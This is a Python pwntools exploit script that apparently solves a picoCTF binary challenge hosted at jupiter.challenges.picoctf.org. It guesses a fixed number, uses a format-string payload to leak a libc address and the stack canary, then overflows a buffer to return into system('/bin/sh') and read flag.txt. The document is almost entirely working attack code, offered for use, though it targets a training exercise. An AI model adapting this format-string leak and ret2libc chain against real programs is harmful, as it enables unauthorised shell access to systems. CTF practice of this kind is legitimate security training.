#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x080487CE
            b* 0x080487FE
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("jupiter.challenges.picoctf.org", 13775)

rand_num = -3727
# LOCAL: Brute force random number
# for i in range(-3800, 4096):
#   # print("Trying " + str(i))
#   p.sendlineafter(b'What number would you like to guess?\n', str(i))
#   output = p.recvline()

#   if b'Congrats' in output:
#       rand_num = i
#       print("Byte found: " + str(i))
#       break

# REMOTE: -3727
p.sendlineafter(b'What number would you like to guess?\n', str(rand_num))
# Leak libc
payload = flat(
    b'%2$p'.ljust(8, b'a'),
    b'%135$p'
    )
p.sendlineafter(b'Name? ', payload)

p.recvuntil(b'Congrats: ')
libc_leak = int(p.recvuntil(b'aaaa', drop=True), 16)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym._IO_2_1_stdin_
print("Libc base: " + hex(libc.address))

# Leak canary
canary = int(p.recvuntil(b'\n', drop=True), 16)
print("Canary: " + hex(canary))

p.sendlineafter(b'What number would you like to guess?\n', str(rand_num))
bin_sh = next(libc.search(b'/bin/sh'))
payload = flat(
    b'a'*0x200,
    canary,
    b'a'*12,
    libc.sym.system,
    bin_sh,
    bin_sh
    )
# GDB()
p.sendlineafter(b'Name? ', payload)
p.sendline(b'cat flag.txt')

p.interactive()